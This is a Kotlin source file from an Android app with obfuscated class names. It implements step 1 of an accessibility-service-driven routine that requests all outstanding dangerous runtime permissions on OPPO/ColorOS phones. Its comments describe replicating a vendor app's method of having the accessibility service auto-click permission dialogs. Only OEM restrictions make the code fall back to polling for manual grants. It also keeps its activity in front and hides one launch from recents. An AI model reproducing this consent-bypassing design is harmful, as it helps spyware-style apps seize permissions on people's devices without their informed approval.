package com.storm.safe.rock.service.modules.yw5xud.oppo

import android.content.Intent
import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.umrkmgrri
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.delay

/**
 * Step 1 -- 基础运行时权限(umrkmgrri 子模块 + resource-id 驱动)。
 *
 * vendor `OppoStepsSimplified.m212323c1` 委托 umrkmgrri.f55158a3.start(context) + 独立 Thread 轮询 20x500ms。
 * replica 采用与 HuaweiSteps.executeStep1BasicPermissions 一致的 resource-id 驱动:
 *  1. 启动 umrkmgrri Activity(等同于华为的 HuaweiPermissionRequestActivity)
 *  2. 10s 轮询主循环:优先 permissioncontroller resource-id 点击,失败降级 text 点击
 *
 * ADAPT: 不用 vendor 的坐标 fallback(华为 FIN-AL60 真机证明 coord 必然 miss)。
 */
class OppoStep1BasicPerms(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: OppoSteps
) {
    companion object {
        private const val TAG = "OppoStep1BasicPerms"
    }

    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val svc = service ?: run {
            failures.add("[Step 1/10] service=null,跳过")
            return
        }
        Log.i(TAG, "[Step1/9] enter executeStep1BasicPermissions")
        logs.add("[Step 1/9] ▶ 基础权限开始(超时15秒)")

        // Phase G#4: 在 iuzxujjtqev Activity 上直接 requestPermissions。
        //
        // 诊断链(OPPO PGFM10 Android 16 / ColorOS 16):
        //   - umrkmgrri 走新 task -> GrantPermissionsActivity 不获 focus -> 自动点击不可能
        //   - iuzxujjtqev 在同 task 上 requestPermissions -> GrantPermissionsActivity 作为 sub-Activity
        //     弹在同 task -> 正常获得 focus -> AccessibilityService 可读
        //
        // 问题: smartReturnToApp 内部有 performGlobalAction(BACK) 会在 0.5s 后把 iuzxujjtqev
        //        弹走 -> getCurrentActivity()=null。修复:Step 1 自己重新拉起 iuzxujjtqev 确保前台。
        val ctx = steps.ctx
        val perms = umrkmgrri.computeRequiredPermissions(ctx)
        if (perms.isEmpty()) {
            logs.add("[Step 1/9] ✓ manifest 所有 dangerous 已授予")
            successes.add("[Step 1/9] 所有 dangerous 已授予")
            return
        }

        // 1. 确保 iuzxujjtqev 在前台(smartReturnToApp 的 BACK 可能已把它弹走)
        var act = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
        if (act == null || act.isFinishing || act.isDestroyed) {
            Log.i(TAG, "[Step1] iuzxujjtqev ref=null,重新拉起确保前台...")
            try {
                val launchIntent = ctx.packageManager.getLaunchIntentForPackage(ctx.packageName)
                launchIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                launchIntent?.putExtra("SMART_RETURN_BACKUP", true)
                launchIntent?.let { ctx.startActivity(it) }
            } catch (e: CancellationException) { throw e } catch (_: Exception) {}
            delay(1500L)
            act = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
        }

        // 2. 在 iuzxujjtqev 上 requestPermissions(同 task,GrantPermissionsActivity 能获 focus)
        if (act != null && !act.isFinishing && !act.isDestroyed) {
            act.runOnUiThread {
                try {
                    androidx.core.app.ActivityCompat.requestPermissions(act, perms.toTypedArray(), 12094)
                } catch (e: Exception) {
                    Log.w(TAG, "[Step1] requestPermissions on iuzxujjtqev failed: ${e.message}")
                }
            }
            logs.add("[Step 1/9] ✓ 在 app 页面直接 requestPermissions(${perms.size} 个)")
            delay(1500L)
        } else {
            // 最终 fallback: 启动 umrkmgrri
            Log.w(TAG, "[Step1] iuzxujjtqev 两次尝试都不可用,fallback 启动 umrkmgrri")
            try {
                val intent = Intent(ctx, umrkmgrri::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                }
                ctx.startActivity(intent)
                logs.add("[Step 1/9] ✓ fallback 启动 umrkmgrri")
                delay(1500L)
            } catch (e: CancellationException) { throw e } catch (e: Exception) {
                Log.w(TAG, "[Step1] launch umrkmgrri failed: ${e.message}")
            }
        }

        // Phase H: ColorOS 16 OEM 限制 -- AccessibilityService 完全看不到 GrantPermissionsActivity。
        // 改为轮询 computeRequiredPermissions 列表长度:缩短=有权限被用户手动授予。
        val timeoutMs = 3_000L
        val start = System.currentTimeMillis()
        val initialCount = perms.size
        var lastRemaining = initialCount

        while (System.currentTimeMillis() - start < timeoutMs) {
            val remaining = umrkmgrri.computeRequiredPermissions(ctx).size
            if (remaining < lastRemaining) {
                val granted = initialCount - remaining
                Log.d(TAG, "[Step1] 权限进度: granted=$granted remaining=$remaining")
                lastRemaining = remaining
            }
            if (remaining == 0) {
                Log.d(TAG, "[Step1] ✓ 所有 dangerous 权限已授予!")
                break
            }
            delay(1000L)
        }

        val finalRemaining = umrkmgrri.computeRequiredPermissions(ctx).size
        val granted = initialCount - finalRemaining
        val elapsedSec = (System.currentTimeMillis() - start) / 1000L
        logs.add("[Step 1/9] 完成,用时 ${elapsedSec}s,授予 $granted/${initialCount} 个权限")
        if (granted > 0) {
            successes.add("[Step 1/9] 用户手动授予 $granted 个权限")
        } else {
            failures.add("[Step 1/9] ${timeoutMs/1000}s 内用户未授予任何权限(ColorOS 16 需手动点击允许)")
        }

        // runStep 统一 HOME 清场
    }
}
